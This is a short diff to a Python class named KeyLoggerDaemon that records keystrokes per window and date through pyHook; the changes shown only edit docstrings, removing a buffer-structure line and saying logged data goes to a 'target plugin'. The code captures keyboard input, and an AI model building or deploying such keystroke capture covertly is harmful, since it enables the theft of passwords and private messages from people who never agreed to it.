@@ -10,8 +10,6 @@ class KeyLoggerDaemon:
     A basic implementation of a python key logger
     stores logged keys per-window per-date in a json format
 
-    buffer structure - {date: {windows name: [list of keystrokes]}}
-
     Considerations:
         - PyHook isn't great and can miss keystrokes
         - Can cause a noticeable slow down on older machines
@@ -30,7 +28,7 @@ class KeyLoggerDaemon:
     def __write_event(self, event: pyHook.KeyboardEvent):
         """
         keyboard press callback, process each key press as necessary.
-        the buffer is written out on every key event
+        then writes the data out to target plugin
         """
         # print(event.WindowName, event.Key, chr(int(event.Ascii)))  # debug
         print(event.Key)
